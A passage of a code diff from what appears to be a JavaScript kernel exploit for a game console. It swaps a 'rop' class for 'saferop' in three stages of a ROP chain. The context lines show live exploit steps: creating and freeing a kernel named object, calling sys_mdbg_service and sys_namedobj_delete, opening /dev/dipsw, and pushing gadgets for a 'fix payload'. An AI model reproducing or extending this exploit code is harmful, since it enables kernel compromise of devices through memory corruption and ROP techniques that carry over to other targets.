@@ -442,7 +442,7 @@
 
         p.write8(namedObj, p.syscall('sys_namedobj_create', stringify("debug"), 0xDEAD, 0x5000));
 
-        var stage1 = new rop(p, undefined);
+        var stage1 = new saferop(p, undefined);
 
         stage1.call(libkernel.add32(window.syscalls[window.syscallnames['sys_thr_suspend_ucontext']]), p.read4(p.read8(leakScePThrPtr)));
         stage1.call(libkernel.add32(window.syscalls[window.syscallnames['sys_open']]), stringify("/dev/dipsw"), 0, 0);
@@ -552,7 +552,7 @@
         //////////////// FREE THE OBJECT ////////////////
         print("Freeing the object!");
 
-        var stage3 = new rop(p, undefined);
+        var stage3 = new saferop(p, undefined);
 
         stage3.call(libkernel.add32(window.syscalls[window.syscallnames['sys_mdbg_service']]), 1, serviceBuff, 0);
         stage3.call(libkernel.add32(window.syscalls[window.syscallnames['sys_namedobj_delete']]), p.read8(namedObj), 0x5000);
@@ -587,7 +587,7 @@
 
         print("Running fix payload...");
 
-        var stage6 = new rop(p, undefined);
+        var stage6 = new saferop(p, undefined);
 
         stage6.push(window.gadgets["pop rax"]);
         stage6.push(11);
